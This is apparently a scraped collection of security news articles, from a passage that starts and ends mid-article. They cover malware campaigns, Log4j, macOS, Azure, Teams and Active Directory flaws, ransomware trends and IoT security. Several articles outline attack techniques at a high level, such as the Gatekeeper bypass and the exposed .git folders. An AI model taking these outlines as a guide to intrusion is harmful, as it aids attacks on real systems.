\n\nWhen a user downloads the file, the code adds exclusions to Windows Defender to stop you from tracking its actions, spawns watchdogs for protection and creates persistence. The overall purpose of the malware is to mine a kind of cryptocurrency called Monero (XMR) – one of the more untraceable and anonymous cryptocurrencies used frequently in the dark web. \n\nUsers afflicted by the malware may not immediately notice any change to their computer. However, as the technology draws on your CPU power, you may begin to see a reduction in speed, and problems with your overall computer functionality. Additionally, the damage is likely to eventually show up in the electricity bill too, as devices need to draw extra power for mining. \nEven Spiderman Isn’t Safe\nAs consumers continue to spend more of their time online, malicious individuals are actively looking for new and improved ways to trick their users into downloading suspicious files. The Spiderman torrent malware is just one excellent example of this. \nReasonLabs found the malware during a routine search of the files in their substantial database. The company has collected a lot of malware data over the years, and routinely checks any files that may be identified as suspicious. After one of ReasonLabs’ users downloaded the Spiderman file, it was immediately flagged as suspicious and marked for investigation. \nCurrently, ReasonLabs are still in the process of actively researching where this malware came from and hope to provide some additional insights soon. In the meantime, be cautious about which spiders you trust. \nThe complete report by ReasonLabs\n\n\nFound this article interesting?

'text': 'Researchers have discovered a new Android banking malware that targets Brazil’s Itaú Unibanco with the help of lookalike Google Play Store pages to carry out fraudulent financial transactions on victim devices without their knowledge.\n“This application has a similar icon and name that could trick users into thinking it is a legitimate app related to Itaú Unibanco,“ Cyble researchers said in a report published last week. “The [threat actor] has created a fake Google Play Store page and hosted the malware that targets Itaú Unibanco on it under the name ’sincronizador.apk.’“\n\nThe tactic of leveraging fake app store pages as a lure is not new. In March, Meta (previously Facebook) disclosed details of an attack campaign that used its platform as part of a broader operation to spy on Uyghur Muslims using rogue third-party websites that used replica domains for popular news portals and websites designed to resemble third-party Android app stores, where attackers put fake keyboard, prayer, and dictionary apps that might appeal to the targets.\n\nIn the latest instance observed by Cyble, the fake URL not only impersonates the official Android app marketplace, but also hosts the malware-laced Itaú Unibanco application, in addition to claiming that the app has had 1,895,897 downloads.\nUsers who install and launch the imposter app from the supposed Google Play Store page are subsequently prompted to enable accessibility services as well as other intrusive permissions that allow the malware to access notifications, retrieve window content, and perform tap and swipe gestures.\n\nThe goal of the trojan, per the researchers, is to perform fraudulent financial transactions on the legitimate Itaú Unibanco application by tampering with the user’s input fields, joining a long list of banking malware that abuse the accessibility API. Google, for its part, has begun imposing new limitations to restrict the use of such permissions that allow apps to capture sensitive information from Android devices.\n\nThis is far from the first time the Sao Paulo-based financial services company has come under the radar of financially-motivated threat groups. Earlier this April, ESET revealed a new banking trojan dubbed Janeleiro that was observed striking corporate users in Brazil at least since 2019 across various sectors such as engineering, healthcare, retail, manufacturing, finance, transportation, and government.\n“Threat Actors constantly adapt their methods to avoid detection and find new ways to target users through increasingly sophisticated techniques. Such malicious applications often masquerade as legitimate applications to trick users into installing them,“ the researchers said.\n“Users should install applications only after verifying their authenticity and install them exclusively from the official Google Play Store and other trusted portals to avoid such attacks.“\n\n\nFound this article interesting?

{'title': 'Expert Details macOS Bug That Could Let Malware Bypass Gatekeeper Security',
'text': 'Apple recently fixed a security vulnerability in the macOS operating system that could be potentially exploited by a threat actor to “trivially and reliably“ bypass a “myriad of foundational macOS security mechanisms“ and run arbitrary code.\nSecurity researcher Patrick Wardle detailed the discovery in a series of tweets on Thursday. Tracked as CVE-2021-30853 (CVSS score: 5.5), the issue relates to a scenario where a rogue macOS app may circumvent Gatekeeper checks, which ensure that only trusted apps can be run and that they have passed an automated process called “app notarization.“\nThe iPhone maker, crediting Gordon Long of Box with reporting the flaw, said it addressed the weakness with improved checks as part of macOS 11.6 updates officially released on September 20, 2021.\n\n“Such bugs are often particularly impactful to everyday macOS users as they provide a means for adware and malware authors to sidestep macOS security mechanisms, …mechanisms that otherwise would thwart infection attempts,“ Wardle said in a technical write-up of the flaw.\nSpecifically, the bug not only gets around Gatekeeper, but also File Quarantine and macOS’s notarization requirements, effectively allowing a seemingly innocuous PDF file to compromise the entire system simply by opening it. According to Wardle, the issue is rooted in the fact that an unsigned, non-notarized script-based application can not explicitly specify an interpreter, resulting in a complete bypass.\n\nIt’s worth noting that a shebang interpreter directive — e.g. #!/bin/sh or #!/bin/bash — is typically used to parse and interpret a shell program. But in this edge-case attack, an adversary can craft an application such that the shebang line is incorporated without providing an interpreter (i.e., #!) and still get the underlying operating system to launch the script without raising any alert.\nThis is so because “macOS will (re)attempt to execute the failed [’interpreter-less’ script-based app] via the shell (’/bin/sh’)“ after the initial lack of success, Wardle explained.\n\nIn other words, threat actors can exploit this flaw by tricking their targets into opening a rogue app that can be camouflaged as Adobe Flash Player updates or trojanized versions of legitimate apps like Microsoft Office, which, in turn, can be delivered through a method called search poisoning where attackers artificially increase the search engine ranking of websites hosting their malware to lure potential victims.\nThis is not the first time flaws have been discovered in the Gatekeeper process. Earlier this April, Apple moved to quickly patch a then actively exploited zero-day flaw (CVE-2021-30657) that could circumvent all security protections, thus permitting unapproved software to be run on Macs.\nThen in October, Microsoft disclosed a vulnerability dubbed “Shrootless“ (CVE-2021-30892), which could be leveraged to perform arbitrary operations, elevate privileges to root, and install rootkits on compromised devices. Apple said it remediated the problem with additional restrictions as part of security updates pushed on October 26, 2021.\n\n\nFound this article interesting?

{'title': 'New Ransomware Variants Flourish Amid Law Enforcement Actions',
'text': 'Ransomware groups continue to evolve their tactics and techniques to deploy file-encrypting malware on compromised systems, notwithstanding law enforcement’s disruptive actions against the cybercrime gangs to prevent them from victimizing additional companies.\n“Be it due to law enforcement, infighting amongst groups or people abandoning variants altogether, the RaaS [ransomware-as-a-service] groups dominating the ecosystem at this point in time are completely different than just a few months ago,“ Intel 471 researchers said in a report published this month. “Yet, even with the shift in the variants, ransomware incidents as a whole are still on the rise.“\nSweeping law enforcement operations undertaken by government agencies in recent months have brought about rapid shifts in the RaaS landscape and turned the tables on ransomware syndicates like Avaddon, BlackMatter, Cl0p, DarkSide, Egregor, and REvil, forcing the actors to slow down or shut down their businesses altogether.\n\nBut just as these variants are fading into obscurity, other up-and-coming groups have stepped in to fill the vacuum. Intel 471’s findings have uncovered a total of 612 ransomware attacks between July to September 2021 that can be attributed to 35 different ransomware variants.\nRoughly 60% of the observed infections were tied to four variants alone — topped by LockBit 2.0 (33%), Conti (15.2%), BlackMatter (6.9%), and Hive (6%) — and primarily impacted manufacturing, consumer and industrial products, professional services and consulting, and real estate sectors.\n\nAvos Locker is one among the many such cartels that have not only witnessed a surge in attacks, but have also adopted new tactics to pursue their financially motivated schemes, chief among them being the ability to disable endpoint security products on the targeted systems and boot into Windows Safe Mode to execute the ransomware. Also installed is the AnyDesk remote administration tool to maintain access to the machine while running in Safe Mode.\n“The reason for this is that many, if not most, endpoint security products do not run in Safe Mode — a special diagnostic configuration in which Windows disables most third-party drivers and software, and can render otherwise protected machines unsafe,“ SophosLabs principal security researcher, Andrew Brandt, said. “The techniques deployed by Avos Locker are simple yet clever, with attackers ensuring that the ransomware has the best chance of running in Safe Mode and allowing the attackers to retain remote access to the machines throughout the attack.“\n\nHive’s RaaS program, for its part, has been dubbed “aggressive“ for its use of pressure tactics to make victim organizations pay ransoms, with Group-IB linking the strain to attacks on 355 companies as of October 16 since it emerged on the landscape in late June 2021. Meanwhile, Russian-language ransomware group Everest is taking its extortion tactics to the next level by threatening to sell off access to targeted systems if their demands aren’t met, NCC Group said.\n\n“While selling ransomware-as-a-service has seen a surge in popularity over the last year, this is a rare instance of a group forgoing a request for a ransom and offering access to IT infrastructure — but we may see copycat attacks in 2022 and beyond,“ the U.K.-based cybersecurity company pointed out.\nWhat’s more, a relatively new ransomware family dubbed Pysa (aka Mespinoza) has unseated Conti as one of the top ransomware threat groups for the month of November alongside LockBit 2.0. The ransomware witnessed a 50% increase in the number of targeted companies and a 400% spike in attacks against government-sector systems when compared to the month of October.\n“While law enforcement around the world has gotten more aggressive in their efforts to arrest those behind attacks, developers are still easily shutting down popular variants, laying low, and coming back with finely-tuned malware used by themselves as well as affiliates,“ Intel 471 researchers said. “As long as the developers can remain in countries where they are granted safe harbor, the attacks will continue, albeit with different variants.“\n\n\nFound this article interesting?

'text': 'Cybersecurity researchers have disclosed details of an evasive malware campaign that makes use of valid code signing certificates to sneak past security defenses and stay under the radar with the goal of deploying Cobalt Strike and BitRAT payloads on compromised systems.\nThe binary, a loader, has been dubbed “Blister“ by researchers from Elastic Security, with the malware samples having negligible to zero detections on VirusTotal. As of writing, the infection vector used to stage the attack, as well as the ultimate objectives of the intrusion, remains unknown.\n\nA notable aspect of the attacks is that they leverage a valid code signing certificate issued by Sectigo. The malware has been observed signed with the certificate in question dating back to September 15, 2021. Elastic said it reached out to the company to ensure that the abused certificates are revoked.\n“Executables with valid code signing certificates are often scrutinized to a lesser degree than unsigned executables,“ researchers Joe Desimone and Samir Bousseaden said. “Their use allows attackers to remain under the radar and evade detection for a longer period of time.“\n\n\nBlister masquerades as a legitimate library called “colorui.dll“ and is delivered via a dropper named “dxpo8umrzrr1w6gm.exe.“ Post execution, the loader is designed to sleep for 10 minutes, likely in an attempt to evade sandbox analysis, only to follow it up by establishing persistence and decrypting an embedded malware payload such as Cobalt Strike or BitRAT.\n“Once decrypted, the embedded payload is loaded into the current process or injected into a newly spawned WerFault.exe [Windows Error Reporting] process,“ the researchers noted.

{'title': 'CISA, FBI and NSA Publish Joint Advisory and Scanner for Log4j Vulnerabilities',
'text': 'Cybersecurity agencies from Australia, Canada, New Zealand, the U.K., and the U.S. on Wednesday released a joint advisory in response to widespread exploitation of multiple vulnerabilities in Apache’s Log4j software library by nefarious adversaries.\n“These vulnerabilities, especially Log4Shell, are severe,“ the intelligence agencies said in the new guidance. “Sophisticated cyber threat actors are actively scanning networks to potentially exploit Log4Shell, CVE-2021-45046, and CVE-2021-45105 in vulnerable systems. These vulnerabilities are likely to be exploited over an extended period.“\n\nAn attacker can exploit Log4Shell (CVE-2021-44228) by submitting a specially crafted request to a vulnerable system that causes that system to execute arbitrary code. CVE-2021-45046, on the other hand, allows for remote code execution in certain non-default configurations, while CVE-2021-45105 could be leveraged by a remote attacker to cause a denial-of-service (DoS) condition.\nSince the vulnerabilities became public knowledge this month, unpatched servers have come under siege from ransomware groups to nation-state hackers, who have used the attack vector as a conduit to gain access to networks to deploy Cobalt Strike beacons, cryptominers, and botnet malware.\nThe U.S. Federal Bureau of Investigation’s (FBI) assessment of the attacks has also raised the possibility that threat actors are incorporating the flaws into “existing cyber criminal schemes that are looking to adopt increasingly sophisticated obfuscation techniques.“ In light of the severity of the vulnerabilities and likely increased exploitation, organizations are being urged to identify, mitigate, and update affected assets as soon as possible. \nTo that end, the U.S. Cybersecurity and Infrastructure Security Agency (CISA) has also released a scanner utility to identify systems vulnerable to the Log4Shell vulnerability, mirroring a similar tool released by the CERT Coordination Center (CERT/CC).\nHowever, Israeli cybersecurity firm Rezilion, in an assessment published this week, found that commercial scanning tools were ill-equipped to detect all formats of the Log4j library in an environment due to the fact that the instances are often deeply nested in other code, revealing the “blindspots“ in such utilities and the limitations of static scanning.\n\n“The biggest challenge lies in detecting Log4Shell within packaged software in production environments: Java files (such as Log4j) can be nested a few layers deep into other files — which means that a shallow search for the file won’t find it,“ Yotam Perkal, vulnerability research lead at Rezilion, said. “Furthermore, they may be packaged in many different formats which creates a real challenge in digging them inside other Java packages.“\nThe public disclosure of Log4Shell has also led a number of technology suppliers to deploy patches for software that contain the flaw. The latest companies to issue updates are NVIDIA and HPE, joining a long list of vendors that have published security advisories detailing the products that are affected by the vulnerability.\nThe latest step taken by the governments arrives as the Apache Software Foundation (ASF) on Monday released updates for Apache HTTP Server to address two flaws — CVE-2021-44790 (CVSS score: 9.8) and CVE-2021-44224 (CVSS score: 8.2) — the former of which could be weaponized by a remote attacker to execute arbitrary code and take control of an affected system.\n\n\nFound this article interesting?

{'title': 'IoT SAFE — An Innovative Way to Secure IoT',
'text': 'By the end of 2021, there will be 12 billion connected IoT devices, and by 2025, that number will rise to 27 billion.\nAll these devices will be connected to the internet and will send useful data that will make industries, medicine, and cars more intelligent and more efficient.\nHowever, will all these devices be safe? It’s worth asking what you can do to prevent (or at least reduce) becoming a victim of a cybercrime such as data theft or other forms of cybercrime in the future?\nWill IoT security ever improve?\nIn recent years, the number of security vulnerabilities related to the Internet of Things has increased significantly.\nLet us start at the very beginning — most IoT devices come with default and publicly disclosed passwords. Moreover, the fact is that there are many cheap and low-capacity Internet of Things devices that lack even the most basic security.\nAnd that’s not all — security experts are discovering new critical vulnerabilities every day. Numerous IoT devices undergoing security audits repeatedly exhibit the same issues over and over again: remote code execution vulnerabilities at the IP or even radio level, unauthenticated or broken access control mechanisms.\nWeak hardware security is one of the issues that have been discovered most frequently. By this complex term, we refer to all the attack possibilities that hackers can exploit when they have an IoT device in their hands: extracting security credentials stored in clear in the device’s memory → Using this data to breach into the servers where the device’s data is sent → sharing or selling these credentials in the “dark web“ to remotely attack other devices of the same type, etc.\n\nThere is a real silent IoT battle going on, and tens of thousands of IoT devices have already been compromised. In order to give you an idea about the level of awareness that is on the rise, the Epidemiology Lab of Orange Cyberdefense provides us with some exciting and frightening figures: In 2019, for example, a vulnerable IoT device could be infected in less than 3 minutes, and in 2021, an IoT device is attacked on an average of 2814 times every single day by more than 100 different botnets trying to hijack it. Therefore, it is not surprising that five years after Mirai, a new IoT botnet called Meris has emerged and was used for massive DDoS attacks against Yandex, a very large Russian search engine website.\n\nLight at the end of the tunnel\nHowever, the situation may start to change in the near future. Recently, Orange, the largest player in the European telecommunications industry, launched an initiative called “IoT SAFE“ in collaboration with Thales, a major manufacturer of electronic devices. It has been shown that collaboration between a network provider and an IoT device manufacturer significantly improves the security of IoT devices (and thus the security posture of their users). \nIoT SAFE has been standardized by the GSMA as a result of a broad collaboration between device and chipset manufacturers, cloud providers, and mobile network operators. \nThe key idea is to use a SIM card (or an embedded SIM) as an applicative KeyStore where security keys are securely stored and dynamically managed. There is no longer a need to hand over secrets to an untrusted provider. There is also no need to add an expensive and dedicated Secure Element. In addition, there is no requirement for proprietary interfaces. \nThanks to IoT SAFE, a wide range of cryptographic services can be covered directly by the SIM card. \nYou may ask: Why do we stick with a SIM or an embedded SIM to secure an IoT device? It’s because SIM cards are very well protected against physical attacks. They are also standardized and can be considered reliable and well-developed chips. All IoT devices that are connected to the cellular network are usually equipped with SIM cards. With 5G for the industrial IoT just around the corner, they will surely retain their popularity. They are also inexpensive, as many mobile IoT devices are small and have cheap sensors, so a specialized chip is probably not needed. \nHow does it work? An example.\nMoreover, this new standard also brings the benefit of overall simplicity to the table. \nAn example of this is “Zero Touch Provisioning.“ In this use case, the network operator remotely installs and configures an instance of the IoT SAFE applet as soon as the IoT device is turned on by the user. Then, the network operator instructs the applet to create a new key pair consisting of a private key that is securely stored on the SIM card and a public key that is sent back to the server. The server generates a new client certificate and sends it back to the applet. Finally, the IoT SAFE compatible device uses this data to establish a secure connection to the cloud using a mutually authenticated TLS session. \nIf it is suspected that the device has been compromised, the credentials are deleted remotely over the mobile network. \nThere are also more complex use cases that can also be covered by IoT SAFE, such as storing critical user data on SIM or authenticating software before execution to prevent the execution of unauthorized code by IoT malware.\nTo a bright and secure IoT world\nOrange released the first open source implementation of the standard in October 2020, based on plain C language. The implementation of this project was tested on two constrained devices using applets from two different vendors. It has been successfully integrated into two well-known public Clouds - Azure and AWS - and into Orange’s own private Live Objects Cloud. Thanks to the permissive license of this open source code, device manufacturers will be able to implement an IoT SAFE compatible device easily.\nThe IoT SAFE initiative has been presented at several conferences, including Java Card Forum, Global Platform, and Mobile IoT Summit. During the seminars, use cases for implementing IoT SAFE were demonstrated and discussed in detail with the IoT community. Thanks to these efforts, wolfSSL has added support for IoT SAFE to their well-known SSL/TLS library.\nOf course, IoT SAFE developments and prototypes were also demonstrated at the Orange booth at this year’s Mobile World Congress. It was obvious that the IoT industry showed great interest after this demonstration. In addition to device manufacturers, chip makers and even an airplane manufacturer, many others were also excited about the potential of IoT SAFE.\nOne for all\nIt is undeniable that these connected devices do not provide adequate security protection. In the era of ever-increasing unsafe devices, there is no doubt that they pose a threat to us all. Moreover, security threats are seen as a major hindrance to the development of IoT markets. According to the Internet of Things World and Omdia, 85% of 170 industry leaders surveyed believe security concerns remain a major barrier to IoT adoption. Often, potential customers are hesitant to purchase IoT objects because they are concerned about them getting compromised.\nUltimately, only reliable and reasonably secure devices will succeed in the market and lead to reasonable IoT business growth. Therefore, the vendor community should actively contribute to IoT security to boost the IoT market and increase business opportunities.\nIf you want to learn more about what the hardworking Orange Cyberdefense researchers have been investigating this year, you can just hop over to the landing page of their recently published Security Navigator.Note — This article is written and contributed by Fabrice Fontaine and Leila de Charette, both from Orange Innovation.\n\n\nFound this article interesting?

{'title': '4-Year-Old Bug in Azure App Service Exposed Hundreds of Source Code Repositories',
'text': 'A security flaw has been unearthed in Microsoft’s Azure App Service that resulted in the exposure of source code of customer applications written in Java, Node, PHP, Python, and Ruby for at least four years since September 2017.\nThe vulnerability, codenamed “NotLegit,“ was reported to the tech giant by Wiz researchers on October 7, 2021, following which mitigations have been undertaken to fix the information disclosure bug in November. Microsoft said a “limited subset of customers“ are at risk, adding “Customers who deployed code to App Service Linux via Local Git after files were already created in the application were the only impacted customers.“\n\nThe Azure App Service (aka Azure Web Apps) is a cloud computing-based platform for building and hosting web applications. It allows users to deploy source code and artifacts to the service using a local Git repository, or via repositories hosted on GitHub and Bitbucket.\n\nThe insecure default behavior occurs when the Local Git method is used to deploy to Azure App Service, resulting in a scenario where the Git repository is created within a publicly accessible directory (home/site/wwwroot).\nWhile Microsoft does add a “web.config“ file to the .git folder — which contains the state and history of the repository — to restrict public access, the configuration files are only used with C# or ASP.NET applications that rely on Microsoft’s own IIS web servers, leaving out apps coded in other programming languages like PHP, Ruby, Python, or Node that are deployed with different web servers like Apache, Nginx, and Flask.\n\n“Basically, all a malicious actor had to do was to fetch the ’/.git’ directory from the target application, and retrieve its source code,“ Wiz researcher Shir Tamari said. “Malicious actors are continuously scanning the internet for exposed Git folders from which they can collect secrets and intellectual property. Besides the possibility that the source contains secrets like passwords and access tokens, leaked source code is often used for further sophisticated attacks.“\n“Finding vulnerabilities in software is much easier when the source code is available,“ Tamari added.\n\n\nFound this article interesting?

'text': 'Microsoft said it won’t be fixing or is pushing patches to a later date for three of the four security flaws uncovered in its Teams business communication platform earlier this March.\nThe disclosure comes from Berlin-based cybersecurity firm Positive Security, which found that the implementation of the link preview feature was susceptible to a number of issues that could “allow accessing internal Microsoft services, spoofing the link preview, and, for Android users, leaking their IP address, and DoS’ing their Teams app/channels.“\n\nOf the four vulnerabilities, Microsoft is said to have addressed only one that results in IP address leakage from Android devices, with the tech giant noting that a fix for the denial-of-service (DoS) flaw will be considered in a future version of the product. The issues were responsibly disclosed to the company on March 10, 2021.\n\nChief among the flaws is a server-side request forgery (SSRF) vulnerability in the endpoint “/urlp/v1/url/info“ that could be exploited to glean information from Microsoft’s local network. Also discovered is a spoofing bug wherein the preview link target can be altered to point to any malicious URL while keeping the main link, preview image and description intact, allowing attackers to hide malicious links and stage improved phishing attacks.\n\nThe DoS vulnerability, which affects the Android version of Teams, could cause the app to crash simply by sending a message with a specially crafted link preview containing an invalid target instead of a legitimate URL. The last of the issues concerns an IP address leak, which also affects the Android app. By intercepting messages that include a link preview to point the thumbnail URL to a non-Microsoft domain, Positive Security said it’s possible to gain access to a user’s IP address and user agent data.\n“While the discovered vulnerabilities have a limited impact, it’s surprising both that such simple attack vectors have seemingly not been tested for before, and that Microsoft does not have the willingness or resources to protect their users from them,“ Positive Security’s co-founder Fabian Bräunlein said.\n\n\nFound this article interesting?

{'title': 'China suspends deal with Alibaba for not sharing Log4j 0-day first with the government',
'text': 'China’s internet regulator, the Ministry of Industry and Information Technology (MIIT), has temporarily suspended a partnership with Alibaba Cloud, the cloud computing subsidiary of e-commerce giant Alibaba Group, for six months on account of the fact that it failed to promptly inform the government about a critical security vulnerability affecting the broadly used Log4j logging library.\nThe development was disclosed by Reuters and South China Morning Post, citing a report from 21st Century Business Herald, a Chinese business-news daily newspaper.\n“Alibaba Cloud did not immediately report vulnerabilities in the popular, open-source logging framework Apache Log4j2 to China’s telecommunications regulator,“ Reuters said. “In response, MIIT suspended a cooperative partnership with the cloud unit regarding cybersecurity threats and information-sharing platforms.“\n\nTracked as CVE-2021-44228 (CVSS score: 10.0) and codenamed Log4Shell or LogJam, the catastrophic security shortcoming allows malicious actors to remotely execute arbitrary code by getting a specially crafted string logged by the software.\nLog4Shell came to light after Chen Zhaojun of Alibaba cloud security team sent an email alerting the Apache Software Foundation (ASF) on November 24 about the flaw, adding that it “has a major impact.“ But just as the fix was being put in place, details of the vulnerability were shared on a Chinese blogging platform by an unidentified actor on December 8, sending the Apache team scrambling to release a patch on December 10.\nPost the bug’s public disclosure, Log4Shell has been subjected to widespread exploitation by threat actors to take control of susceptible servers, thanks to the near-ubiquitous use of the library, which can be found in a variety of consumer and enterprise services, websites, and applications — as well as in operational technology products — that rely on it to log security and performance information.\nIn the ensuing days, further investigation into Log4j by the cybersecurity community has since uncovered three more weaknesses in the Java-based tool, prompting the project maintainers to ship a series of security updates to contain real-world attacks exploiting the flaws.\n\nIsraeli security firm Check Point noted that it has blocked over 4.3 million exploitation attempts so far, with 46% of those intrusions made by known malicious groups. “This vulnerability may cause the device to be remotely controlled, which will cause serious hazards such as theft of sensitive information and device service interruption,“ the MIIT had previously said in a public statement published on December 17, adding it was only made aware of the flaw on December 9, 15 days after the initial disclosure.\nThe pushback from MIIT arrives months after the Chinese government issued new stricter vulnerability disclosure regulations that mandate software and networking vendors affected with critical flaws, alongside entities or individuals engaged in network product security vulnerability discovery, to report them first-hand to the government authorities mandatorily within two days.\nIn September, the government also followed it up by launching “cyberspace security and vulnerability professional databases“ for the reporting of security vulnerabilities in networks, mobile apps, industrial control systems, smart cars, IoT devices, and other internet products that could be targeted by threat actors.\nUpdate: After China’s internet security regulator dropped Alibaba Cloud from its cyber threat intelligence partnership for six months, the cloud computing company on Thursday said it would work towards improving its risk management and compliance, according to a new report from the South China Morning Post. Alibaba Cloud also said it did not fully comprehend the severity of the flaw and that it did not share the details with the government in a timely fashion.\n\n\nFound this article interesting?

{'title': 'New Exploit Lets Malware Attackers Bypass Patch for Critical Microsoft MSHTML Flaw',
'text': 'A short-lived phishing campaign has been observed taking advantage of a novel exploit that bypassed a patch put in place by Microsoft to fix a remote code execution vulnerability affecting the MSHTML component with the goal of delivering Formbook malware.\n“The attachments represent an escalation of the attacker’s abuse of the CVE-2021-40444 bug and demonstrate that even a patch can’t always mitigate the actions of a motivated and sufficiently skilled attacker,“ SophosLabs researchers Andrew Brandt and Stephen Ormandy said in a new report published Tuesday.\nCVE-2021-40444 (CVSS score: 8.8) relates to a remote code execution flaw in MSHTML that could be exploited using specially crafted Microsoft Office documents. Although Microsoft addressed the security weakness as part of its September 2021 Patch Tuesday updates, it has been put to use in multiple attacks ever since details pertaining to the flaw became public.\n\nThat same month, the technology giant uncovered a targeted phishing campaign that leveraged the vulnerability to deploy Cobalt Strike Beacons on compromised Windows systems. Then in November, SafeBreach Labs reported details of an Iranian threat actor operation that targeted Farsi-speaking victims with a new PowerShell-based information stealer designed to gather sensitive information.\nThe new campaign discovered by Sophos aims to get around the patch’s protection by morphing a publicly available proof-of-concept Office exploit and weaponizing it to distribute Formbook malware. The cybersecurity firm said the success of the attack can, in part, be attributed to a “too-narrowly focused patch.“\n\n“In the initial versions of CVE-2021-40444 exploits, [the] malicious Office document retrieved a malware payload packaged into a Microsoft Cabinet (or .CAB) file,“ the researchers explained. “When Microsoft’s patch closed that loophole, attackers discovered they could use a different attack chain altogether by enclosing the maldoc in a specially crafted RAR archive.“\nCAB-less 40444, as the modified exploit is called, lasted for 36 hours between October 24 and 25, during which spam emails containing a malformed RAR archive file were sent to potential victims. The RAR file, in turn, included a script written in Windows Script Host (WSH) and a Word Document that, upon opening, contacted a remote server hosting malicious JavaScript.\nConsequently, the JavaScript code utilized the Word Document as a conduit to launch the WSH script and execute an embedded PowerShell command in the RAR file to retrieve the Formbook malware payload from an attacker-controlled website.\n\nAs for why the exploit disappeared a little over a day in use, clues lie in the fact that the modified RAR archive files wouldn’t work with older versions of the WinRAR utility. “So, unexpectedly, in this case, users of the much older, outdated version of WinRAR would have been better protected than users of the latest release,“ the researchers said.\n“This research is a reminder that patching alone cannot protect against all vulnerabilities in all cases,“ SophosLabs Principal Researcher Andrew Brandt said. “Setting restrictions that prevent a user from accidentally triggering a malicious document helps, but people can still be lured into clicking the ’enable content’ button.“\n“It is therefore vitally important to educate employees and remind them to be suspicious of emailed documents, especially when they arrive in unusual or unfamiliar compressed file formats from people or companies they don’t know,“ Brandt added. When reached for a response, a Microsoft spokesperson said “we are investigating these reports and will take appropriate action as needed to help keep customers protected.“\nUpdate: Microsoft told The Hacker News that the aforementioned exploit was indeed addressed with security updates that were released in September 2021. Sophos now notes that the CAB-less 40444 exploit “may have evaded mitigations of CVE-2021-40444 without the September patch focused on the CAB-style attack“ and that the patch blocks the malicious behavior.\n\n\nFound this article interesting?

'text': 'Microsoft is urging customers to patch two security vulnerabilities in Active Directory domain controllers that it addressed in November following the availability of a proof-of-concept (PoC) tool on December 12.\nThe two vulnerabilities — tracked as CVE-2021-42278 and CVE-2021-42287 — have a severity rating of 7.5 out of a maximum of 10 and concern a privilege escalation flaw affecting the Active Directory Domain Services (AD DS) component. Credited with discovering and reporting both the bugs is Andrew Bartlett of Catalyst IT.\n\nActive Directory is a directory service that runs on Microsoft Windows Server and is used for identity and access management. Although the tech giant marked the shortcomings as “exploitation Less Likely“ in its assessment, the public disclosure of the PoC has prompted renewed calls for applying the fixes to mitigate any potential exploitation by threat actors.\n\nWhile CVE-2021-42278 enables an attacker to tamper with the SAM-Account-Name attribute, which is used to log a user into systems in the Active Directory domain, CVE-2021-42287 makes it possible to impersonate the domain controllers. This effectively grants a bad actor with domain user credentials to gain access as a domain admin user.\n\n“When combining these two vulnerabilities, an attacker can create a straightforward path to a Domain Admin user in an Active Directory environment that hasn’t applied these new updates,“ Microsoft’s senior product manager Daniel Naim said. “This escalation attack allows attackers to easily elevate their privilege to that of a Domain Admin once they compromise a regular user in the domain.“\nThe Redmond-based company has also provided a step-by-step guide to help users ascertain if the vulnerabilities might have been exploited in their environments. “As always, we strongly advise deploying the latest patches on the domain controllers as soon as possible,“ Microsoft said.\n\n\nFound this article interesting?

'text': 'The transportation industry and government agencies related to the sector are the victims of an ongoing campaign since July 2020 by a sophisticated and well-equipped cyberespionage group in what appears to be yet another uptick in malicious activities that are “just the tip of the iceberg.“\n“The group tried to access some internal documents (such as flight schedules and documents for financial plans) and personal information on the compromised hosts (such as search histories),“ Trend Micro researchers Nick Dai, Ted Lee, and Vickie Su said in a report published last week.\nEarth Centaur, also known by the monikers Pirate Panda and Tropic Trooper, is a long-running threat group focused on information theft and espionage that has led targeted campaigns against government, healthcare, transportation, and high-tech industries in Taiwan, the Philippines, and Hong Kong dating all the way back to 2011.\n\nThe hostile agents, believed to be a Chinese-speaking actor, are known for their use of spear-phishing emails with weaponized attachments to exploit known vulnerabilities, while simultaneously advancing their malicious tools with obfuscation, stealthiness, and striking power.\n“This threat group is proficient at red teamwork,“ the researchers elaborated. “The group knows how to bypass security settings and keep its operation unobstructive. The usage of the open-source frameworks also allows the group to develop new backdoor variants efficiently.“\nIn May 2020, the operators were observed fine-tuning their attack strategies with new behaviors by deploying a USB trojan dubbed USBFerry to strike physically isolated networks belonging to government institutions and military entities in Taiwan and the Philippines in a bid to siphon sensitive data through removable flash drives.\nThe latest multi-stage intrusion sequence detailed by Trend Micro involves the group turning to exploit vulnerable Internet Information Services (IIS) servers and Exchange server flaws as entry points to install a web shell that’s then leveraged to deliver a .NET-based Nerapack loader and a first-stage backdoor known as Quasar on the compromised system.\nFrom there, the attackers follow it up by dropping an arsenal of second-stage implants like ChiserClient, SmileSvr, ChiserClient, HTShell, and bespoke versions of Lilith RAT and Gh0st RAT depending on the victim to retrieve further instructions from a remote server, download additional payloads, perform file operations, execute arbitrary commands, and exfiltrate results back to the server.\nIt doesn’t end there. After successful exploitation of the system, Tropic Trooper also attempts to breach the intranet, dump credentials, and wipe out event logs from the infected machines using a specific set of tools. Also put to use is a command-line program called Rclone that enables the actor to copy harvested data to different cloud storage providers.\n\n“Currently, we have not discovered substantial damage to these victims as caused by the threat group,“ Trend Micro’s analysts explained. “However, we believe that it will continue collecting internal information from the compromised victims and that it is simply waiting for an opportunity to use this data.“\nThe findings are noteworthy because of the steps the advanced persistent threat (APT) takes to avoid detection and the critical nature of the targeted entities, not to mention the new capabilities developed for their malicious software to linger on infected hosts and avoid detection.\n“The group can map their target’s network infrastructure and bypass firewalls,“ the researchers said. “It uses backdoors with different protocols, which are deployed depending on the victim. It also has the capability to develop customized tools to evade security monitoring in different environments, and it exploits vulnerable websites and uses them as [command-and-control] servers.“\n\n\nFound this article interesting?

'text': 'Even with the growing awareness about cybersecurity, many myths about it are prevalent. These misconceptions can be a barrier to effective security. \nThe first step to ensure the security of your business is to separate the false information, myths, and rumors from the truth.\nHere, we’re busting some common cybersecurity myths. Read on to find out which of the following you thought were true.\nCybersecurity Myths vs. Truths\nMyth #1 — Too much security diminishes productivity\nThere is a common idea that increased security makes it difficult for even employees to access what they need, not just hackers. Strict security policies such as regular monitoring and access control are believed to hinder productivity at work. However, doing away with security may have far-reaching consequences for your business. A successful attack like a DDoS attackor ransomware can bring your business to a standstill. Employees might not be able to access important files, networks, and information after an attack. The recovery takes days and sometimes even weeks.\nTruth: Enhanced cybersecurity can boost productivity.\nA modern cybersecurity approach uses security tools that have a built-in security feature that integrates seamlessly into your system. It also leverages advanced tech intelligence and analytics for real-time detection and mitigation of threats. This allows developers to concentrate on improving their productivity since they no longer need to worry about security issues.\nMyth #2 — Cyberattacks are only caused by external threat actors\nInsider threats 